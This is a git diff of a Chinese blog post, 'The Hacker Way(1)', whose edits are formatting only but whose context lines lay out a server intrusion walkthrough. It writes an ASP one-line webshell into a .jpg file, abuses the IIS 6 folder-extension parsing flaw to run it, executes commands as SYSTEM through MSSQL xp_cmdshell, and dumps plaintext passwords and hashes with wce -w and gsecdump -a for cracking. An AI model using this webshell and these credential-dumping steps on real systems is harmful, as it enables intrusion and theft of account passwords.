@@ -1,8 +1,8 @@
 ---
-layout: page
-title: The Hacker Way(1)
-category: 技术
-tags: Hacker
+layout: page  
+title: The Hacker Way(1)  
+category: 技术  
+tags: Hacker   
 ---
 {% include JB/setup %}
 
@@ -23,7 +23,7 @@ tags: Hacker
 - 制作包含ASP webshell代码的正常后缀名文件, 例如jpg文件
 echo "<%execute(request("MH"))%>" >> jinbin.jpg
 - 上传此文件至刚才新创建的文件夹内
-此处利用了IIS 6处理文件夹扩展名时，将/*.asp/目录下的所有文件都作为ASP文件进行解析的漏洞。此时，IIS 6将jinbin.jsp作为ASP文件处理。
+此处利用了IIS 6处理文件夹扩展名时，将/\*.asp/目录下的所有文件都作为ASP文件进行解析的漏洞。此时，IIS 6将jinbin.jsp作为ASP文件处理。
 
 ##### Step2. 查找可进行提权的漏洞
 完成第一步，仅仅只能获得普通权限，一般情况下其实什么也做不了。所以，找到提权的漏洞是第二步。
@@ -42,9 +42,9 @@ echo "<%execute(request("MH"))%>" >> jinbin.jpg
 利用植入的大马(猥琐的老湿事先已经准备好)，和Step2中得到的用户名、密码，通过MSSQL的扩展存储xp_cmdshell可直接执行命令，且权限为system
 
 ##### Step4. 获取账号hash
-1. <wce> 可以通过wce -w 获取目前正处于登录状态的所有账号明文密码。   
+1. wce 可以通过wce -w 获取目前正处于登录状态的所有账号明文密码。   
    WCE全称Windows Credentials Editor。
-2. <gsecdump> 可以通过gsecdump -a 获取处于这台服务器上的账号密码hash，然后通过彩虹表进行破解.  
+2. gsecdump 可以通过gsecdump -a 获取处于这台服务器上的账号密码hash，然后通过彩虹表进行破解.  
 这里可以参考http://www.objectif-securite.ch/en/ophcrack.php (在线LM Hash破解网站)  
 
 这里的命令都利用了Step3 中的xp_cmdshell来执行。
